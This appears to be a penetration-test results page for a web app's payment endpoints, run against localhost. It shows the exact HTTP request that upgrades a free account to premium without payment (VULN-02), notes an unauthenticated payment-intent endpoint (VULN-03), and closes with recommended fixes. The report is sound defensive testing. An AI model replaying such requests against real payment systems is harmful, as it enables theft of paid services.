# Test Results — 03 Payment Escalation (VULN-02, VULN-03)

**Script:** `analysis/scripts/03-test-payment-escalation.sh`  
**Run date:** 2026-05-31T12:52:36Z  
**Raw log:** [VULN-02-payment-escalation.txt](../evidence/VULN-02-payment-escalation.txt)  
**Status:** **VULN-02 CONFIRMED LIVE**

---

## VULN-02 — Subscription escalation without payment (CRITICAL)

### Steps performed

1. Registered test user `security.tester@paksentiment.local` (free tier)
2. Logged in and obtained JWT (payload showed `"role":"free"`, `"tier":"free"`)
3. Called `POST /payments/fulfill-subscription` **without any Stripe payment**

### Request

```http
POST http://localhost:3000/payments/fulfill-subscription
Authorization: Bearer <JWT>
Content-Type: application/json

{"planName":"Premium Plan"}
```

### Response

```json
{"success":true,"newTier":"premium"}
```

HTTP **201**

### Verdict

**CRITICAL — CONFIRMED.** Any authenticated user can upgrade to premium by sending a plan name string. No PaymentIntent verification, no Stripe webhook, no payment proof.

---

## VULN-03 — Unauthenticated create-intent

### Request

```http
POST http://localhost:3000/payments/create-intent
Content-Type: application/json

{"amount":19,"planName":"Premium"}
```

### Response

```json
{
  "message": [
    "property amount should not exist",
    "property planName should not exist"
  ],
  "error": "Bad Request",
  "statusCode": 400
}
```

### Analysis

The endpoint has **no `@UseGuards(AuthGuard)`** (still publicly reachable), but the inline `CreatePaymentIntentDto` class lacks `class-validator` decorators. The global `ValidationPipe` with `forbidNonWhitelisted: true` rejects all body properties.

| Aspect | Status |
|--------|--------|
| Authentication required | **No** (design flaw) |
| Currently exploitable for Stripe abuse | **No** (accidental DTO misconfiguration blocks body) |
| Risk if DTO fixed without adding auth | **High** |

### Verdict

**VULN-03 partially present** — missing auth on a sensitive endpoint; currently blocked by validation misconfiguration rather than intentional security control.

---

## JWT payload before escalation (decoded)

```json
{
  "sub": 11,
  "email": "security.tester@paksentiment.local",
  "role": "free",
  "tier": "free"
}
```

After `fulfill-subscription`, user's `subscriptionTier` in PostgreSQL is updated to `premium` (re-login would reflect in JWT `tier` claim).

---

## Summary

| ID | Severity | Live result |
|----|----------|-------------|
| VULN-02 | **Critical** | **Confirmed** — tier upgraded without payment |
| VULN-03 | Medium | Endpoint public; blocked by DTO validation bug |

## Recommended fix

Stripe webhook verification before tier update; remove or secure `fulfill-subscription`; add `@UseGuards(AuthGuard)` and proper DTO on `create-intent`.
